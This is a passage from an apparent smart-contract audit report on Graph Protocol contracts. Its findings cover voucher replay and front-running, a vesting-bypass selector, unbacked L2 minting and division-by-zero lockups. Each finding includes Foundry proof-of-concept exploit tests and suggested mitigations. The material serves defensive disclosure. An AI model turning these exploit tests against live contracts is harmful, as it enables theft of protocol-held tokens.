    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); balanceOf[from] -= amount; allowance[from][msg.sender] -= amount; balanceOf[to] += amount; return true; }
}

contract MockStaking2 {
    MockGraphToken2 public token;
    mapping(address => uint256) public collected;
    constructor(MockGraphToken2 t) { token = t; }
    function collect(uint256 amount, address allocationID) external { require(token.transferFrom(msg.sender, address(this), amount), "pull"); collected[allocationID] += amount; }
}

contract AllocationExchangeFrontrunTest is Test {
    function testCopiedVoucherConsumesAllocationBeforeOriginalRedeemer() external {
        uint256 signerPk = 0xA11CE;
        address signer = vm.addr(signerPk);
        address governor = address(0xBEEF);
        address intendedRedeemer = address(0x1111);
        address attacker = address(0x2222);
        address allocationID = address(0xCAFE);
        uint256 amount = 100 ether;
        MockGraphToken2 token = new MockGraphToken2();
        MockStaking2 staking = new MockStaking2(token);
        AllocationExchange exchange = new AllocationExchange(IGraphToken(address(token)), IStaking(address(staking)), governor, signer);
        token.mint(address(exchange), amount);
        exchange.approveAll();
        bytes32 digest = keccak256(abi.encodePacked(allocationID, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        AllocationExchange.AllocationVoucher memory voucher = AllocationExchange.AllocationVoucher(allocationID, amount, sig);
        vm.prank(attacker);
        exchange.redeem(voucher);
        assertEq(exchange.allocationsRedeemed(allocationID), true);
        assertEq(staking.collected(allocationID), amount);
        vm.prank(intendedRedeemer);
        vm.expectRevert("Exchange: allocation already redeemed");
        exchange.redeem(voucher);
    }
}

## Suggested Mitigation
Include the intended redeemer or recipient and optionally an authorized relayer in the signed voucher, and require msg.sender or the final recipient to match it. For batched relays, use EIP-712 typed data with per-voucher recipient, deadline, nonce, and domain separation; alternatively use a commit-reveal or private relay flow for bearer vouchers.


## [H-136]. Replayable AllocationExchange vouchers can drain funded deployments or revived signer epochs

## id: gN3VVdG4Rhc4aEudFrjFy

## Derived From Pattern/Invariant
PermitFrontRun / GlobalParamMidFlowManipulation

## Exploit Type
SignatureReplay

## Location
AllocationExchange._redeem

## Finding Status: Valid
### Finding Status Justification: This finding combines two root causes that are both present in AllocationExchange._redeem: the signed payload is only allocationID and amount, and the recovered signer is checked against the current authority boolean. The voucher omits contract address, chain ID, nonce, deadline, and authority epoch, while allocationsRedeemed is only local to one deployment and allocationID. As a result, the same signature can be accepted in another compatible funded AllocationExchange that authorizes the signer, or after the same signer is later reauthorized, unless that local allocationID has already been redeemed. No complete replay or stale-signature safeguard exists. The code is in an in-scope production contract and the risky behavior is not explicitly documented as accepted. Permissionless redeem is sufficient once a valid voucher is available; exploitation does not require attacker privilege or compromised keys. The root cause exists today, so it is not invalid as future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
AllocationExchange authenticates vouchers only over allocationID and amount, then checks the recovered signer against the current live authority mapping. The signed payload omits address(this), block.chainid, a nonce, a deadline, and an authority epoch. Vulnerable snippet: bytes32 messageHash = keccak256(abi.encodePacked(_voucher.allocationID, _voucher.amount)); address voucherSigner = ECDSA.recover(messageHash, _voucher.signature); require(authority[voucherSigner], "Exchange: invalid signer"); allocationsRedeemed[_voucher.allocationID] = true; STAKING.collect(_voucher.amount, _voucher.allocationID);. Because allocationsRedeemed is local to one deployment and one allocationID, the same signature can be accepted by any AllocationExchange deployment that authorizes the same signer and has compatible staking/allocation state. Separately, if governance disables an authority and later re-enables the same EOA for normal operations, every old unexpired voucher from that EOA becomes valid again because there is no revocation epoch or deadline in the signed message. A permissionless holder of such a stale or cross-domain voucher can make STAKING.collect pull GRT from the exchange into the signed allocation even though the signature was not intended for the current domain or authority epoch.

## Impact
A permissionless redeemer can use stale or cross-domain signatures to collect GRT from a funded AllocationExchange. If the voucher amount and exchange balance are significant, this is direct loss of protocol-held GRT to an attacker-controlled allocation; otherwise it creates unbounded stale liability that governance cannot invalidate without permanently abandoning the signer address.

## Proof of Concept
1. An authorized signer signs keccak256(abi.encodePacked(allocationID, amount)) for one context, or signs before being revoked.
2. The signature is leaked, copied, or retained by the allocation controller.
3. The target AllocationExchange currently has authority[signer] == true, either because the same signer is configured on another deployment or because the signer was reauthorized.
4. The attacker calls redeem() with the old signature. Since the contract does not bind the signature to chain ID, contract address, nonce, deadline, or authority epoch, ECDSA.recover returns an authorized signer.
5. allocationsRedeemed only prevents reuse for this allocationID on this one deployment, so STAKING.collect(amount, allocationID) pulls funds from the exchange.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {AllocationExchange} from "../contracts/payments/AllocationExchange.sol";
import {IGraphToken} from "@graphprotocol/interfaces/contracts/contracts/token/IGraphToken.sol";
import {IStaking} from "@graphprotocol/interfaces/contracts/contracts/staking/IStaking.sol";

contract MockGraphToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockStaking {
    MockGraphToken public immutable token;
    mapping(address => uint256) public collected;
    constructor(MockGraphToken _token) { token = _token; }
    function collect(uint256 amount, address allocationID) external { require(token.transferFrom(msg.sender, address(this), amount), "pull failed"); collected[allocationID] += amount; }
}

contract AllocationExchangeReplayPoC is Test {
    uint256 internal constant AUTHORITY_PK = 0xA11CE;
    address internal authority = vm.addr(AUTHORITY_PK);
    address internal governor = address(0xB0B);
    address internal allocation = address(0xA110CA7100);

    function _sign(uint256 amount) internal returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(allocation, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(AUTHORITY_PK, h);
        return abi.encodePacked(r, s, v);
    }

    function _deploy(MockGraphToken token, MockStaking staking, uint256 funded) internal returns (AllocationExchange ex) {
        ex = new AllocationExchange(IGraphToken(address(token)), IStaking(address(staking)), governor, authority);
        token.mint(address(ex), funded);
        ex.approveAll();
    }

    function testSameVoucherReplaysAcrossExchangeDomains() external {
        MockGraphToken token = new MockGraphToken();
        MockStaking staking = new MockStaking(token);
        uint256 amount = 1_000_000 ether;
        AllocationExchange ex1 = _deploy(token, staking, amount);
        AllocationExchange ex2 = _deploy(token, staking, amount);
        bytes memory sig = _sign(amount);

        AllocationExchange.AllocationVoucher memory v1 = AllocationExchange.AllocationVoucher({allocationID: allocation, amount: amount, signature: sig});
        AllocationExchange.AllocationVoucher memory v2 = AllocationExchange.AllocationVoucher({allocationID: allocation, amount: amount, signature: sig});
        ex1.redeem(v1);
        ex2.redeem(v2);

        assertEq(staking.collected(allocation), 2 * amount);
        assertEq(token.balanceOf(address(ex1)), 0);
        assertEq(token.balanceOf(address(ex2)), 0);
    }

    function testOldVoucherRevivesWhenSignerIsReauthorized() external {
        MockGraphToken token = new MockGraphToken();
        MockStaking staking = new MockStaking(token);
        uint256 amount = 1_000_000 ether;
        AllocationExchange ex = _deploy(token, staking, amount);
        bytes memory sig = _sign(amount);
        AllocationExchange.AllocationVoucher memory voucher = AllocationExchange.AllocationVoucher({allocationID: allocation, amount: amount, signature: sig});

        vm.prank(governor);
        ex.setAuthority(authority, false);
        vm.expectRevert(bytes("Exchange: invalid signer"));
        ex.redeem(voucher);

        vm.prank(governor);
        ex.setAuthority(authority, true);
        ex.redeem(voucher);

        assertEq(staking.collected(allocation), amount);
        assertEq(token.balanceOf(address(ex)), 0);
    }
}


## Suggested Mitigation
Use an EIP-712 typed-data voucher that includes block.chainid, address(this), allocationID, amount, recipient or intended allocation controller if applicable, nonce, deadline, and an authorityEpoch. Increment a per-authority epoch whenever an authority is disabled or re-enabled, and store consumed voucher digests/nonces rather than only allocationsRedeemed[allocationID]. Reject expired vouchers and provide an explicit revocation mechanism for outstanding signatures.





Finding Status: InvalidGovernanceRisk
## [L-137]. Authorized token selectors let beneficiaries bypass lock schedules through fallback forwarding

## id: Kh6-cI1bpC2qDbdBkKmKA

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
GraphTokenLockManager.setAuthFunctionCall

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The fallback forwards beneficiary calldata to whatever target the manager maps for msg.sig. The manager only checks that the target is a contract and not itself, so the GRT token and custody-changing ERC20 selectors are not blocked. This can bypass release if configured. The code is in scope and lacks a complete selector/target denylist, but the exploit depends on trusted owner configuration.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLockWallet.fallback forwards beneficiary calldata to the manager-configured target using the wallet as msg.sender. GraphTokenLockManager._setAuthFunctionCall only checks that the target is a contract and not the manager; it does not reject dangerous selectors such as `transfer(address,uint256)`, `approve(address,uint256)`, or `transferFrom(address,address,uint256)` when the target is the locked token. Vulnerable snippets: `authFnCalls[sigHash] = _target;` and wallet fallback `Address.functionCall(_target, msg.data);`. If such a selector is authorized to the token, the beneficiary can make the wallet directly transfer or approve locked GRT outside release().

## Impact
For non-revocable wallets, an unsafe authorized selector can bypass the vesting schedule and transfer or approve the entire wallet GRT balance before it is releasable.

## Proof of Concept
1. The manager configures `transfer(address,uint256)` as an authorized function targeting the GRT token. 2. A non-revocable lock wallet has locked tokens and is not yet matured. 3. The beneficiary calls the wallet with calldata for token.transfer(attacker, amount). 4. The wallet fallback forwards the calldata to the token as msg.sender=wallet. 5. The token transfers locked GRT immediately without updating releasedAmount or enforcing availableAmount.

## Proof of Code
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockManager.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/IGraphTokenLock.sol';
contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 a) external { balanceOf[to]+=a; } function transfer(address to,uint256 a) external returns(bool){ require(balanceOf[msg.sender]>=a,'bal'); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; } function approve(address s,uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; } function transferFrom(address f,address t,uint256 a) external returns(bool){ require(balanceOf[f]>=a,'bal'); require(allowance[f][msg.sender]>=a,'allow'); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; } }
contract ForwardedTokenTransferPoC is Test { function testAuthorizedTransferSelectorBypassesSchedule() public { address beneficiary = address(0xBEEF); address attacker = address(0xCAFE); MockToken token = new MockToken(); GraphTokenLockWallet impl = new GraphTokenLockWallet(); GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(impl)); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); wallet.initialize(address(manager), address(this), beneficiary, address(token), 100 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 100 ether); manager.setAuthFunctionCall('transfer(address,uint256)', address(token)); vm.warp(101); assertEq(wallet.releasableAmount(), 0); vm.prank(beneficiary); (bool ok,) = address(wallet).call(abi.encodeWithSignature('transfer(address,uint256)', attacker, 100 ether)); assertTrue(ok); assertEq(token.balanceOf(attacker), 100 ether); assertEq(wallet.releasedAmount(), 0); } }

## Suggested Mitigation
Reject dangerous locked-token selectors in `_setAuthFunctionCall`, including transfer, approve, transferFrom, increaseAllowance, and permit-style functions. Prefer an allowlist of audited protocol selectors and verify that the target is not the locked token for fund-moving selectors.


## [L-138]. Manager can fund minimal proxies whose masterCopy has no executable code

## id: 18R6YuY2OOUXXDjxIYBuy

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift / InitOrderOrUnintialized

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
GraphTokenLockManager.setMasterCopy

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: setMasterCopy only rejects address(0). MinimalProxyFactory can deploy a proxy to a no-code implementation and Address.functionCall checks only that the proxy has code. The initializer can succeed without initializing expected state, after which managed GRT is transferred. No isContract check or post-initialization validation exists. The trigger requires trusted owner/admin action.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
setMasterCopy() validates only that the new master copy is nonzero. Unlike _setAuthFunctionCall(), it does not require Address.isContract(_masterCopy). Minimal proxies deployed with a no-code implementation can still be created, and the initializer call through the proxy can return successfully without initializing expected GraphTokenLockWallet state. createTokenLockWallet() then transfers the managed GRT to the unusable proxy. Vulnerable snippet: `function setMasterCopy(address _masterCopy) public override onlyOwner { require(_masterCopy != address(0), "MasterCopy cannot be zero"); masterCopy = _masterCopy; }`.

## Impact
A valid owner call can create and fund token-lock proxy addresses that do not execute wallet logic, potentially stranding managed GRT in unusable proxy contracts. Because this requires the trusted manager owner to set a bad master copy, the practical severity is low under the provided trusted-role rules.

## Proof of Concept
1. The manager owner sets masterCopy to a nonzero EOA or precompile-like no-code address. 2. The owner calls createTokenLockWallet() with a positive managed amount. 3. _deployProxy2 deploys the EIP-1167 proxy and calls the initializer through it. 4. The proxy delegates to a no-code address and does not initialize wallet state. 5. The manager transfers GRT to the proxy, which cannot execute release or recovery logic.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockGRT is ERC20 { constructor() ERC20("GRT","GRT") { _mint(msg.sender, 1e30); } }
contract NoCodeMasterCopyTest is Test { function testNoCodeMasterCopyCanReceiveManagedTokens() public { MockGRT token = new MockGRT(); address noCodeMaster = address(0x123456); GraphTokenLockManager manager = new GraphTokenLockManager(token, noCodeMaster); address beneficiary = address(0xBEEF); token.transfer(address(manager), 100 ether); bytes memory init = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), address(this), beneficiary, address(token), 100 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); address predicted = manager.getDeploymentAddress(keccak256(init), noCodeMaster); manager.createTokenLockWallet(address(this), beneficiary, 100 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); assertEq(token.balanceOf(predicted), 100 ether); assertEq(GraphTokenLockWallet(payable(predicted)).isInitialized(), false); } }

## Suggested Mitigation
Require Address.isContract(_masterCopy) in setMasterCopy() and optionally verify that the implementation exposes the expected initializer selector and immutable codehash before accepting it.


## [M-139]. Zero period duration bricks release and revoke during active lock schedules

## id: 8pY7cdVd4449l4qS8uONz

## Derived From Pattern/Invariant
ConfigFootgun

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration / currentPeriod / release / revoke

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code path exists in the in-scope GraphTokenLock implementation. _initialize requires startTime < endTime and periods >= 1, but does not require periods <= duration. periodDuration returns duration().div(periods), so periods greater than duration makes it zero. currentPeriod then divides by periodDuration, and availableAmount, vestedAmount, releasableAmount, release, and revoke can reach that path while currentTime is not greater than endTime. There is no complete safeguard. The issue is not documented as an accepted risk. It is exploitable in today's code after a lock is initialized with that boundary configuration, but creating such a lock requires the owner/manager privileged initialization path. The fault is still in missing validation, not solely user misuse, and it is not future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_initialize() accepts periods greater than the schedule duration in seconds. In that case periodDuration() returns zero, and currentPeriod() divides by zero. All schedule-dependent paths that call availableAmount() or vestedAmount(), including releasableAmount(), release(), and revoke(), revert during the active schedule.

Vulnerable snippet:
require(_startTime < _endTime, "Start time > end time");
require(_periods >= MIN_PERIOD, "Periods cannot be below minimum");
...
function periodDuration() public view override returns (uint256) {
    return duration().div(periods);
}
function currentPeriod() public view override returns (uint256) {
    return sinceStartTime().div(periodDuration()).add(MIN_PERIOD);
}

## Impact
A lock initialized with an accepted but invalid period configuration becomes unusable during its active window. Beneficiaries cannot release vested tokens, and owners cannot revoke revocable locks until the current time is greater than endTime.

## Proof of Concept
1. Initialize a lock with startTime = 1000, endTime = 1010, and periods = 11.
2. The initializer accepts the configuration because startTime < endTime and periods >= 1.
3. periodDuration() returns floor(10 / 11) = 0.
4. During the active schedule, currentPeriod() divides by zero.
5. releasableAmount(), release(), vestedAmount(), and revoke() revert, blocking both beneficiary release and owner revocation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLock.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract TestLock is GraphTokenLock {
    function initialize(address owner_, address beneficiary_, address token_, uint256 managedAmount_, uint256 startTime_, uint256 endTime_, uint256 periods_) external {
        _initialize(owner_, beneficiary_, token_, managedAmount_, startTime_, endTime_, periods_, 0, 0, IGraphTokenLock.Revocability.Enabled);
    }
}

contract GraphTokenLockZeroPeriodDosTest is Test {
    function testZeroPeriodDurationBricksReleaseAndRevoke() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        MockERC20 token = new MockERC20();
        TestLock lock = new TestLock();
        lock.initialize(owner, beneficiary, address(token), 100 ether, 1000, 1010, 11);
        token.mint(address(lock), 100 ether);

        vm.warp(1005);
        assertEq(lock.periodDuration(), 0);

        vm.expectRevert();
        lock.releasableAmount();

        vm.prank(beneficiary);
        vm.expectRevert();
        lock.release();

        vm.prank(owner);
        vm.expectRevert();
        lock.revoke();
    }
}

## Suggested Mitigation
Reject invalid schedules during initialization with require(_periods <= _endTime - _startTime, "Period duration cannot be zero"). Also consider replacing periodDuration-based division with elapsed-time math that cannot divide by zero and caps passed periods to periods.


## [H-140]. Inherited minter role lets L2GraphToken supply be minted outside the bridge

## id: BonWd42IiJTSCnuNvTt7b

## Derived From Pattern/Invariant
AccountingInvariantViolation: every L2 supply increase must be backed by a gateway bridgeMint

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphToken.mint (inherited from GraphTokenUpgradeable)

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code path exists: L2GraphToken.initialize() calls GraphTokenUpgradeable._initialize(_owner, 0), and that initializer calls _addMinter(_owner). GraphTokenUpgradeable exposes external mint(address,uint256) with onlyMinter, so the initialized owner/governor is a minter unless removed, and governance can add further minters. This means non-gateway minting can occur without bridgeMint() or BridgeMinted. The file and deployed L2GraphToken asset are in scope, and no shown code fully disables inherited mint() or removes the default minter during initialization. The comments state zero initial supply because tokens are supposed to be minted through the bridge, so this is not explicitly accepted by design. However, exploitation of this specific mint path requires a minter role, initially the owner/governor or a minter added by governance. Under the supplied privileged-role assumptions, admin/governance/minter-role abuse is trusted and invalidating for this check, even though the mechanical code path exists now. It is not future speculation and does not depend on user mistake.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
L2GraphToken documents zero initial supply because tokens are only supposed to be minted through the L2GraphTokenGateway, but initialize() calls GraphTokenUpgradeable._initialize(_owner, 0), and that initializer unconditionally adds _owner as a minter. The inherited external mint(address,uint256) therefore remains callable by the default minter or any later minter added by governance, increasing L2 totalSupply without msg.sender == gateway and without any BridgeMinted event or L1 escrowed deposit. Vulnerable snippet: L2GraphToken.initialize() calls GraphTokenUpgradeable._initialize(_owner, 0); GraphTokenUpgradeable._initialize() then executes _addMinter(_owner); and GraphTokenUpgradeable.mint(address _to, uint256 _amount) external onlyMinter { _mint(_to, _amount); }.

## Impact
A configured non-gateway minter can inflate Arbitrum GRT supply outside the canonical bridge accounting. If such tokens enter protocol markets or staking/payment flows, L2 GRT can become undercollateralized relative to L1 escrowed GRT and significant value can be diluted or extracted from users relying on bridge-backed supply.

## Proof of Concept
1. Deploy an L2GraphToken harness and initialize it with governor as owner. 2. Set a gateway address different from governor. 3. Observe governor is automatically a minter even though L2 supply should only be created by bridgeMint. 4. Call inherited mint() from governor/minter, not from gateway. 5. totalSupply and attacker balance increase without BridgeMinted and without any gateway call.

## Proof of Code
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {L2GraphToken} from "../graphprotocol-contracts/packages/contracts/contracts/l2/token/L2GraphToken.sol";
import {GraphTokenUpgradeable} from "../graphprotocol-contracts/packages/contracts/contracts/token/GraphTokenUpgradeable.sol";

contract L2GraphTokenHarness is L2GraphToken {
    function harnessInitialize(address owner) external {
        GraphTokenUpgradeable._initialize(owner, 0);
    }
}

contract L2GraphTokenMintInvariantPoC is Test {
    function testMinterCanMintOutsideGateway() public {
        address governor = address(0xA11CE);
        address gateway = address(0xBEEF);
        address attacker = address(0xCAFE);

        L2GraphTokenHarness token = new L2GraphTokenHarness();
        token.harnessInitialize(governor);

        vm.prank(governor);
        token.setGateway(gateway);

        assertEq(token.gateway(), gateway);
        assertEq(token.totalSupply(), 0);
        assertEq(token.isMinter(governor), true);

        vm.prank(governor);
        token.mint(attacker, 1_000_000 ether);

        assertEq(token.balanceOf(attacker), 1_000_000 ether);
        assertEq(token.totalSupply(), 1_000_000 ether);
    }
}


## Suggested Mitigation
Do not expose GraphTokenUpgradeable.mint/addMinter semantics on the L2 bridge representation. Use a dedicated L2 token base where only bridgeMint can call _mint, or make mint/addMinter unavailable for L2GraphToken. Ensure initialization does not add the governor as a minter and remove any existing non-gateway minters during migration.


## [M-141]. Division-by-zero schedule bricks GraphTokenLockWallet releases when periods exceed duration

## id: gQyL8CVcSsjv_Nex0mMD0

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
GraphTokenLockWallet.initialize/currentPeriod

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: GraphTokenLockWallet.initialize calls GraphTokenLock._initialize, which lacks any periods <= endTime - startTime validation. The active schedule then reaches periodDuration() == 0 and currentPeriod() divides by zero. This matches the finding and affects release-related views and release(). No complete safeguard exists. The affected contracts are in analyzed in-scope production source. Because creating such a wallet is owner/manager controlled, exploitation requires a privileged configuration action. The issue is not documented as intentional and does not depend on future changes.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLockWallet.initialize delegates to GraphTokenLock._initialize, which only requires startTime < endTime and periods >= 1. periodDuration() then computes duration().div(periods), so a valid-looking lock with periods greater than endTime - startTime has periodDuration() == 0. currentPeriod() divides by periodDuration(), causing currentPeriod(), passedPeriods(), availableAmount(), releasableAmount(), and release() to revert during the active schedule. Vulnerable snippet: function periodDuration() public view returns (uint256) { return duration().div(periods); } function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }

## Impact
The beneficiary cannot release vested tokens during the lock schedule. For large token-distribution wallets this can temporarily freeze user funds until currentTime() > endTime, and all schedule-dependent views revert during the active period.

## Proof of Concept
1. Create a wallet with startTime = 100, endTime = 110, and periods = 11. 2. Fund it with managedAmount. 3. Warp to timestamp 105. 4. periodDuration() returns 0. 5. currentPeriod(), availableAmount(), releasableAmount(), and release() revert on division by zero.

## Proof of Code
pragma solidity ^0.8.13; import 'forge-std/Test.sol'; import '../contracts/GraphTokenLockWallet.sol'; contract PeriodZeroPoC is Test { GraphTokenLockWallet wallet; MockToken token; MockManager manager; address owner = address(0x1); address beneficiary = address(0x2); function setUp() public { token = new MockToken(); manager = new MockManager(); wallet = new GraphTokenLockWallet(); wallet.initialize(address(manager), owner, beneficiary, address(token), 100 ether, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 100 ether); } function testPeriodsGreaterThanDurationBricksSchedule() public { vm.warp(105); assertEq(wallet.periodDuration(), 0); vm.expectRevert(); wallet.currentPeriod(); vm.prank(beneficiary); vm.expectRevert(); wallet.release(); } }

## Suggested Mitigation
In _initialize, require _periods <= _endTime - _startTime so periodDuration() is always nonzero. Consider also requiring duration() % periods == 0 or explicitly capping passedPeriods to periods.


## [L-142]. GraphTokenLockManager can deploy and fund unusable proxies when masterCopy has no code

## id: uFZfooDyfYFfSCTHrAQDq

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
GraphTokenLockManager.setMasterCopy/createTokenLockWallet

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: setMasterCopy permits any nonzero address. A minimal proxy deployed with a no-code implementation still has proxy code, so Address.functionCall checks the proxy rather than the implementation. The initializer can no-op and createTokenLockWallet transfers managed GRT afterward. The path is in scoped production code, but it requires trusted owner/admin configuration.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`setMasterCopy()` only rejects the zero address. It does not require the new master copy to contain code, unlike `_setAuthFunctionCall()` which checks `Address.isContract`. A minimal proxy pointing to an EOA still has proxy bytecode, so `Address.functionCall(proxyAddress, initializer)` checks the proxy rather than the implementation. The proxy delegatecall to an address with no code can return success without initializing wallet storage, after which `createTokenLockWallet()` transfers managed GRT into the unusable proxy. Vulnerable snippet: `require(_masterCopy != address(0), "MasterCopy cannot be zero"); masterCopy = _masterCopy;`.

## Impact
Manager-held GRT can be transferred into a deterministic proxy that does not behave as a token lock wallet. The funded proxy cannot expose initialized lock state or release functions, stranding the managed amount.

## Proof of Concept
1. The manager is configured with a nonzero EOA as masterCopy. 2. The manager has enough GRT and createTokenLockWallet is called. 3. CREATE2 deploys a minimal proxy pointing to the EOA. 4. The initializer call does not initialize wallet state. 5. The manager transfers the managed amount to the proxy, where token lock functions cannot be used to recover it.

## Proof of Code
pragma solidity ^0.7.3;\nimport \"forge-std/Test.sol\";\nimport \"../contracts/GraphTokenLockManager.sol\";\nimport \"../contracts/GraphTokenLockWallet.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\ncontract MockGRT is ERC20 { constructor() ERC20(\"GRT\", \"GRT\") {} function mint(address to, uint256 amount) external { _mint(to, amount); } }\ncontract BadMasterCopyPoC is Test {\n    function testEOAMasterCopyCreatesFundedUninitializedProxy() public {\n        MockGRT token = new MockGRT();\n        address eoaMasterCopy = address(0x1234);\n        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), eoaMasterCopy);\n        uint256 amount = 100 ether;\n        token.mint(address(manager), amount);\n        bytes memory initializer = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), address(this), address(0xBEEF), address(token), amount, uint256(1000), uint256(2000), uint256(1), uint256(0), uint256(0), IGraphTokenLock.Revocability.Disabled);\n        address predicted = manager.getDeploymentAddress(keccak256(initializer), eoaMasterCopy);\n        manager.createTokenLockWallet(address(this), address(0xBEEF), amount, 1000, 2000, 1, 0, 0, IGraphTokenLock.Revocability.Disabled);\n        assertEq(token.balanceOf(predicted), amount);\n        vm.expectRevert();\n        IGraphTokenLock(predicted).currentBalance();\n    }\n}

## Suggested Mitigation
Require `Address.isContract(_masterCopy)` in `setMasterCopy()` and optionally verify that the implementation supports the expected initializer before accepting it.


## [M-143]. Zero period duration DoSes revocation and release during the full vesting window

## id: 9Q_fWFi-oNqueSDsZdHdH

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath / periodDuration can be zero for initialized locks

## Exploit Type
Dos

## Location
GraphTokenLock.revoke

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The root cause exists. _initialize permits periods greater than duration because it only enforces periods >= 1 and startTime < endTime. periodDuration can therefore be zero, and currentPeriod divides by it. revoke on a revocable lock calls vestedAmount, which calls availableAmount and reaches currentPeriod during the active window; release follows the same schedule path through releasableAmount. There is no complete nonzero-duration safeguard. The target is an in-scope production token distribution contract and no documentation accepts this exact bricking risk. It is exploitable in today's code with an accepted lock configuration, but the configuration requires privileged initialization by the lock owner/manager. The missing validation is a protocol fault, not solely user error, and the finding does not depend on future code.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
_initialize requires _periods >= 1 but does not require _periods <= duration(). If periods is greater than endTime - startTime, periodDuration() returns zero. currentPeriod() then divides by periodDuration(), so availableAmount(), vestedAmount(), releasableAmount(), release(), and revoke() can all revert during the active schedule. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD). For revocable accepted locks, the owner cannot cancel and revoke() is unusable until after endTime, when no unvested amount remains.

## Impact
Revocable locked funds can become unrecoverable by the owner throughout the vesting window. The beneficiary can accept the lock, wait until after endTime, and release the full balance while the owner had no working revoke path during the period when revocation should have been possible.

## Proof of Concept
1. Initialize a revocable accepted lock with duration 10 seconds and periods 11. 2. The beneficiary accepts the lock, preventing cancelLock(). 3. During the active schedule, owner revoke() reverts due to division by zero in currentPeriod(). 4. After endTime, availableAmount() returns managedAmount and the beneficiary releases all tokens.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLock.sol";
